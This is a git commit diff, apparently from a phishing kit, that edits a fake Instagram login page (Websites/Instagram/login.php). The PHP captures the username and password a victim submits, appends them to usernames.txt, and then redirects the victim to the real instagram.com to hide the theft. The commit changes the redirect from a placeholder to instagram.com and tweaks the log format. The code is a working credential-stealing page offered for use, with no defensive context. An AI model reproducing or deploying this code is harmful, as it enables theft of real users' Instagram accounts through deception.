5700ac728c4bf92d295596ebdf263a753b536f8c
inc0gnit0 <iinc0gnit0@pm.me>
2019-12-05 20:33:29 -0600

    Add files via upload

--- Websites/Instagram/login.php
+++ Websites/Instagram/login.php
@@ -1,7 +1,7 @@
 <?php
 
-file_put_contents("usernames.txt", "[EMAIL]:  " . $_POST['username'] . " [PASS]:  " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: YOUR SITE HERE'); # This is where your site will redirect to #
+file_put_contents("usernames.txt", "[EMAIL]:  " . $_POST['username'] . "   [PASS]:  " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://instagram.com'); # This is where your site will redirect to, you may change it(default: instagram.com) #
 exit();
 
 ?>
